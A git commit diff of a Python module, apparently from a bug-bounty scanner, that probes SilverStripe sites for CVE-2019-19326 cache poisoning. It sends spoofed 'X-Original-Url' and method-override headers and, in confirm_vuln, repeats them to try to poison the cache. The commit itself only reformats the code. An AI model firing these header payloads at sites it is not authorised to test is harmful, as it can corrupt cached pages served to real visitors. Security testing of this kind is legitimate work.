3eca79f6c3a94fb81e404b834e59b3d182cbb1a9
Kharaone.BB <bugbounty@khara.one>
2025-09-20 14:39:29 +0200

    lint(CVE201919326): streamline authent parameter handling and improve code readability

--- modules/cp_cve/CVE201919326.py
+++ modules/cp_cve/CVE201919326.py
@@ -6,9 +6,7 @@ https://docs.silverstripe.org/en/3/changelogs/3.7.5/
 """
 
 
-from requests.auth import AuthBase
-
-from utils.style import Identify
+from utils.style import Colors, Identify
 from utils.utils import (
     BIG_CONTENT_DELTA_RANGE,
     CONTENT_DELTA_RANGE,
@@ -20,16 +18,21 @@ from utils.utils import (
 logger = configure_logger(__name__)
 
 
-
-
 def confirm_vuln(
     url: str,
     s: requests.Session,
-    authent:tuple[str, str] | AuthBase | None,
-    headers: dict
+    headers: dict,
+    authent: tuple[str, str] | None,
 ) -> None:
     for _ in range(5):
-        s.get(url, verify=False, auth=authent, headers=headers, timeout=10, allow_redirects=False)
+        s.get(
+            url,
+            verify=False,
+            auth=authent,
+            headers=headers,
+            timeout=10,
+            allow_redirects=False,
+        )
     s.get(url, verify=False, auth=authent, timeout=10, allow_redirects=False)
 
 
@@ -38,37 +41,57 @@ def silverstripe(
     s: requests.Session,
     req_main: requests.Response,
     custom_header: dict,
-    authent:tuple[str, str] | AuthBase | None
+    authent: tuple[str, str] | None,
 ) -> None:
 
     main_len = len(req_main.content)
-    headers = {
-    "X-Original-Url": "plopiplop",
-    "X-HTTP-Method-Override": "POST"
-    }
+    headers = {"X-Original-Url": "plopiplop", "X-HTTP-Method-Override": "POST"}
     try:
-        req = s.get(url, verify=False, auth=authent, headers=headers, timeout=10, allow_redirects=False)
+        req = s.get(
+            url,
+            verify=False,
+            auth=authent,
+            headers=headers,
+            timeout=10,
+            allow_redirects=False,
+        )
         len_req = len(req.content)
 
-
-        range_exlusion = range(main_len - CONTENT_DELTA_RANGE, main_len + CONTENT_DELTA_RANGE) if main_len < 10000 else range(main_len - BIG_CONTENT_DELTA_RANGE, main_len + BIG_CONTENT_DELTA_RANGE)
+        range_exlusion = (
+            range(main_len - CONTENT_DELTA_RANGE, main_len + CONTENT_DELTA_RANGE)
+            if main_len < 10000
+            else range(
+                main_len - BIG_CONTENT_DELTA_RANGE, main_len + BIG_CONTENT_DELTA_RANGE
+            )
+        )
 
         if "plopiplop" in req.text or "plopiplop" in req.headers:
-            print(f" {Identify.behavior} | CVE-2019-19326 | TAG OK | \033[34m{url}\033[0m | PAYLOAD: {headers}")
-            confirm_vuln(url, s, authent, headers)
-        elif len_req not in range_exlusion and req.status_code not in [403, 429, 301, 302]:
-            print(f" {Identify.behavior} | CVE-2019-19326 | \033[34m{url}\033[0m | DIFFERENT RESPONSE LENGTH {main_len}b > {len_req}b | PAYLOAD: {headers}")
-            confirm_vuln(url, s, authent, headers)
-        elif req.status_code != req_main.status_code and req.status_code not in [403, 429]:
-            print(f" {Identify.behavior} | CVE-2019-19326 | \033[34m{url}\033[0m | DIFFERENT STATUS-CODE | {req_main.status_code} > {req.status_code} | PAYLOAD: {headers}")
-            confirm_vuln(url, s, authent, headers)
-    except requests.Timeout:
-        #print(f"request timeout {url} {p}")
-        pass
+            print(
+                f" {Identify.behavior} | CVE-2019-19326 | TAG OK | {Colors.BLUE}{url}{Colors.RESET} | PAYLOAD: {headers}"
+            )
+            confirm_vuln(url, s, headers, authent)
+        elif len_req not in range_exlusion and req.status_code not in [
+            403,
+            429,
+            301,
+            302,
+        ]:
+            print(
+                f" {Identify.behavior} | CVE-2019-19326 | {Colors.BLUE}{url}{Colors.RESET} | DIFFERENT RESPONSE LENGTH {main_len}b > {len_req}b | PAYLOAD: {headers}"
+            )
+            confirm_vuln(url, s, headers, authent)
+        elif req.status_code != req_main.status_code and req.status_code not in [
+            403,
+            429,
+        ]:
+            print(
+                f" {Identify.behavior} | CVE-2019-19326 | {Colors.BLUE}{url}{Colors.RESET} | DIFFERENT STATUS-CODE | {req_main.status_code} > {req.status_code} | PAYLOAD: {headers}"
+            )
+            confirm_vuln(url, s, headers, authent)
+    except requests.Timeout as t:
+        logger.error(f"request timeout {url}", t)
     except KeyboardInterrupt:
         print("Exiting")
         sys.exit()
     except Exception as e:
-        #print(f"Error : {e}")
         logger.exception(e)
-        pass
